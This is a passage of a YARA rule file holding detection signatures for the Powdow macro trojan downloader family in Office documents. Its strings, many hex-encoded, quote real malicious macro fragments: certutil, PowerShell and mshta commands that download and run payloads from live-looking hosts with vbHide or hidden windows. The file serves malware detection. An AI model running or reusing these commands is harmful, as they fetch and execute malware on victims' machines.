        detection_name = "TrojanDownloader:O97M/Powdow.RPWD!MTB"
        threat_id = "2147818443"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 64 6f 77 6e 6c 6f 61 64 73 74 72 69 6e 67 28 27 68 74 74 70 3a 2f 2f 31 33 38 2e 32 30 31 2e 31 34 39 2e 34 33 2f [0-31] 2f [0-7] 2e 70 73 31 27 29}  //weight: 1, accuracy: Low
        $x_1_2 = "=createprocessa(0&,chr(112)+\"ower\"+\"shell.exe\"+chr(150)+\"windowstylehidden\"+\"iex(new-objectnet.webclient).downloadstring('http://" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_YPD_2147818456_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.YPD!MTB"
        threat_id = "2147818456"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 74 72 61 6e 73 66 65 72 2e 73 68 2f 67 65 74 2f 71 53 4e 62 59 4e 2f 4e 78 64 63 6f 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 00 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBB_2147818488_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBB!MTB"
        threat_id = "2147818488"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\\\ProgramData\\\\ddond.com https://taxfile.mediafire.com/\" + \"file/vix2glog75u2ikg/30.htm/file\"" ascii //weight: 1
        $x_1_2 = "Chr$(Asc(Mid$(EoPY6GWVej, I, 1)) + Asc(Mid$(GuSqwMIoE88F, J, 1)))" ascii //weight: 1
        $x_1_3 = "Replace(solingerimo, \"5\", \"i\")" ascii //weight: 1
        $x_1_4 = "VBA.GetObject(Finkolachomati).Get(solingerimo).Create makwakabeer, Null, Null, pid" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZPD_2147818510_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZPD!MTB"
        threat_id = "2147818510"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 38 34 2e 33 38 2e 31 32 39 2e 35 31 2f 31 32 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 00 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STFV_2147818891_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STFV!MTB"
        threat_id = "2147818891"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 2e 35 38 2e 31 34 39 2e 32 2f 31 2e 65 78 65 22 22 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBC_2147819003_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBC!MTB"
        threat_id = "2147819003"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "obj.Add \"aksjdlaksjdqowijdenewc\"" ascii //weight: 1
        $x_1_2 = {22 68 74 22 0d 0a 6f 62 6a 2e 41 64 64 20 22 74 70 73 22}  //weight: 1, accuracy: High
        $x_1_3 = "Mid$(strText, 1, lngUsed)" ascii //weight: 1
        $x_1_4 = "onesesese = obj.GetStr" ascii //weight: 1
        $x_1_5 = "Call ALKSJDKLASJDLKAJSDLKAJSDKLJASLKDJLKASKLASNCMLSANCMAS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBC_2147819003_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBC!MTB"
        threat_id = "2147819003"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {22 57 53 43 52 49 50 54 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 50 69 63 74 75 72 65 73 5c 74 65 78 74 66 69 6c 65 2e 4a 53 22 0d 0a 43 61 6c 6c 20 53 68 65 6c 6c 28 61 2c 20 76 62 4e 6f 72 6d 61 6c 46 6f 63 75 73 29}  //weight: 1, accuracy: High
        $x_1_2 = {57 6f 72 6b 73 68 65 65 74 73 28 22 53 68 65 65 74 32 22 29 2e 52 61 6e 67 65 28 22 53 4f 58 31 30 38 22 29 0d 0a 50 72 69 6e 74 20 23 54 65 78 74 46 69 6c 65 2c 20 79 6f 75 74 75 62 65}  //weight: 1, accuracy: High
        $x_1_3 = "Open myFile For Output As TextFile" ascii //weight: 1
        $x_1_4 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZZPD_2147819360_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZZPD!MTB"
        threat_id = "2147819360"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 33 2e 37 30 2e 31 35 37 2e 37 39 2f 63 6c 61 73 73 2f 6c 6f 61 64 65 72 2f 75 70 6c 6f 61 64 73 2f [0-15] 2e 62 61 74 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KAAN_2147819445_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KAAN!MTB"
        threat_id = "2147819445"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://2.58.149.2/mony.exe\"\" Jujvpqagwuez.exe.exe && Jujvpqagwuez.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBD_2147819461_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBD!MTB"
        threat_id = "2147819461"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"c:\\users\\public\\update.js\"" ascii //weight: 1
        $x_1_2 = "worksheets(\"lol\").range(\"l5\")opensfileforoutputas#1print#1,youtube" ascii //weight: 1
        $x_1_3 = "wscript\"+sfile:::::::::::debug.print" ascii //weight: 1
        $x_1_4 = "callvba.shell!(asss,vbnormalfocus)" ascii //weight: 1
        $x_1_5 = "workbook_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZYPD_2147819842_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZYPD!MTB"
        threat_id = "2147819842"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 32 2e 35 38 2e 31 34 39 2e 32 2f [0-15] 2e [0-3] 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 02 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KAAO_2147819852_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KAAO!MTB"
        threat_id = "2147819852"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"http://ddl8.data.hu/get/282834/13310000/Arewd.exe\"\" Bqyjrpchggppb.exe.exe && Bqyjrpchggppb.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_PKAA_2147819858_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.PKAA!MTB"
        threat_id = "2147819858"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 63 61 6e 61 64 61 65 78 70 6f 72 74 73 63 65 6e 74 72 65 2e 63 6f 6d 2f 68 70 2f [0-31] 2e 65 78 65 22}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 65 78 65 2e 65 78 65 20 26 26 20 [0-47] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBE_2147819973_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBE!MTB"
        threat_id = "2147819973"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"WSCRIPT C:\\Users\\Public\\Pictures\\textfile.JS\"" ascii //weight: 1
        $x_1_2 = {57 6f 72 6b 73 68 65 65 74 73 28 22 53 68 65 65 74 32 22 29 2e 52 61 6e 67 65 28 22 53 4f 53 31 31 31 22 29 0d 0a 50 72 69 6e 74 20 23 54 65 78 74 46 69 6c 65 2c 20 79 6f 75 74 75 62 65}  //weight: 1, accuracy: High
        $x_1_3 = "Open myFile For Output As TextFile" ascii //weight: 1
        $x_1_4 = "Call Shell(a, vbNormalFocus)" ascii //weight: 1
        $x_1_5 = "Workbook_Open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBF_2147820351_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBF!MTB"
        threat_id = "2147820351"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 2f 77 77 77 2e 61 73 69 61 6e 65 78 70 6f 72 74 67 6c 61 73 73 2e 73 68 6f 70 2f 70 2f [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 53 68 65 6c 6c 5e 28 22 77 73 63 72 69 70 74 20 22 20 2b 20 6b 6f 61 6b 73 6f 64 6b 61 73 64 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: High
        $x_1_3 = "ActiveXObject('Wscript.Shell');KALYJA = \"\"msht\"" ascii //weight: 1
        $x_1_4 = "C:\\Users\\Public\\zaim.js" ascii //weight: 1
        $x_1_5 = "Open koaksodkasd For Output As #321" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBG_2147820380_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBG!MTB"
        threat_id = "2147820380"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {41 63 74 69 76 65 58 4f 62 6a 65 63 74 28 27 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 27 29 3b [0-20] 20 3d 20 22 22 6d 73 68 74 22}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c [0-20] 2e 6a 73}  //weight: 1, accuracy: Low
        $x_1_3 = {2f 2f 77 77 77 2e 61 73 69 61 6e 65 78 70 6f 72 74 67 6c 61 73 73 2e 73 68 6f 70 2f 70 2f [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {4f 70 65 6e 20 [0-20] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 33 32 31}  //weight: 1, accuracy: Low
        $x_1_5 = {43 61 6c 6c 20 53 68 65 6c 6c ?? 28 22 77 73 63 72 69 70 74 20 22 20 2b 20 [0-20] 29 0d 0a 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_6 = "Sub Workbook_BeforeClose" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STIV_2147820474_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STIV!MTB"
        threat_id = "2147820474"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 67 72 65 67 6f 72 79 70 65 72 63 69 76 61 6c 2e 63 6f 2e 75 6b 2f 77 70 2d 69 6e 64 65 78 2f 43 71 69 6d 61 77 64 69 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-31] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_KAAU_2147821078_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.KAAU!MTB"
        threat_id = "2147821078"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Shell(\"cmd /c certutil.exe -urlcache -split -f \"\"https://cdn.discordapp.com/attachments/984522909378809948/984528744188346428/NetflixCrackers_Bsjfstey.jpg\"\" Qwjuqoncb.exe.exe && Qwjuqoncb.exe.exe\", vbHide)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBH_2147821088_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBH!MTB"
        threat_id = "2147821088"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w.run(\\\"\"mshta%20http://www.coalminners.shop/p/18.html\\\"\"" ascii //weight: 1
        $x_1_2 = "Call Shell!(\"rundll32 \" + kulabear)" ascii //weight: 1
        $x_1_3 = "Sub Workbook_BeforeClose" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STOV_2147821139_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STOV!MTB"
        threat_id = "2147821139"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellExec_RunDLL \"\"mshta\"\" \"\"http://www.asianexportglass.shop/p/3.html\"\"\"" ascii //weight: 1
        $x_1_2 = "Call Shell!(\"rundll32 \" + kulabear)" ascii //weight: 1
        $x_1_3 = "Sub Workbook_BeforeClose" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBI_2147822831_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBI!MTB"
        threat_id = "2147822831"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(\"new:13709620-C279-11CE-A49E-444553540000\")" ascii //weight: 1
        $x_1_2 = ".ShellExecute obj.GETMainService2, obj.GETMainService, \"\", \"\", 0" ascii //weight: 1
        $x_1_3 = "Caesar_Cipher(ASDIOUWDOIHQWKDWQ, -10)" ascii //weight: 1
        $x_1_4 = {6f 62 6a 2e 41 64 64 20 22 72 64 64 7a 63 22 0d 0a 6f 62 6a 2e 41 64 64 20 22 3a 2f 2f 22}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_STTV_2147822958_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.STTV!MTB"
        threat_id = "2147822958"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 35 2e 32 35 35 2e 38 38 2e 31 31 2f 73 68 6f 74 73 2f [0-31] 2e 65 78 65 22 22 20 [0-47] 2e 65 78 65 2e 65 78 65 20 26 26 20 [0-47] 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBK_2147823238_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBK!MTB"
        threat_id = "2147823238"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(\"wscript.shell\")wshshell.runchr(34)&my_filename&chr(34)" ascii //weight: 1
        $x_1_2 = "auto_open()rows(\"3:42\").hidden=falseconstmy_filename=\"c:\\users\\public\\new.bat\"" ascii //weight: 1
        $x_1_3 = "powershell-execbypass-nop-whidden-noni-enc\"&chr(34)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZAPD_2147824148_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZAPD!MTB"
        threat_id = "2147824148"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 34 36 2e 32 34 39 2e 33 35 2e 31 39 36 2f 6d 69 64 2f [0-32] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZBPD_2147824751_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZBPD!MTB"
        threat_id = "2147824751"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 3a 2f 2f 35 2e 32 35 35 2e 38 38 2e 31 36 39 2f 6d 69 6e 74 2f [0-32] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ZCPD_2147824781_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ZCPD!MTB"
        threat_id = "2147824781"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 68 65 6c 6c 28 22 63 6d 64 20 2f 63 20 63 65 72 74 75 74 69 6c 2e 65 78 65 20 2d 75 72 6c 63 61 63 68 65 20 2d 73 70 6c 69 74 20 2d 66 20 22 22 68 74 74 70 73 3a 2f 2f 61 6d 63 6f 72 65 74 72 75 73 74 2e 63 6f 6d 2f [0-32] 2e 65 78 65 22 22 20 [0-31] 2e 65 78 65 2e 65 78 65 20 26 26 20 01 2e 65 78 65 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_RVBL_2147825043_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.RVBL!MTB"
        threat_id = "2147825043"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
